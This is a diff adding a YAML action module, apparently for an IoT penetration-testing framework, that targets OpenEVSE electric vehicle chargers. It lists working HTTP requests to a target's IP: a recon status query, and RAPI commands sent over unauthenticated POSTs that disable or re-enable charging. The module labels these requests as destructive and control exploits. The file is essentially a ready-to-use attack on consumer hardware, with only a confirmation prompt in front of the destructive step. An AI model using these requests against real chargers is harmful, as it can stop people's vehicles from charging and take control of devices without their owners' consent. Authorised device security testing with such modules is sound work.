@@ -1,0 +1,36 @@
+id: openevse
+device_type: ev_charger
+vendor: OpenEVSE
+family: openevse
+requires: {}
+actions:
+  - id: status
+    label: "Get charge status"
+    category: recon
+    dangerous: false
+    steps:
+      - http_request:
+          url: "http://{{target.ip}}/status"
+          save_as: status
+      - http_request:
+          url: "http://{{target.ip}}/r?json=1&rapi=$GS"
+          save_as: rapi_status
+
+  - id: disable-charge
+    label: "Disable charging"
+    category: exploit_destructive
+    dangerous: true
+    confirm_prompt: "This will stop the car from charging. Continue?"
+    steps:
+      - http_request:
+          url: "http://{{target.ip}}/r?json=1&rapi=$FD"
+          method: POST
+
+  - id: enable-charge
+    label: "Enable charging"
+    category: exploit_control
+    dangerous: false
+    steps:
+      - http_request:
+          url: "http://{{target.ip}}/r?json=1&rapi=$FE"
+          method: POST
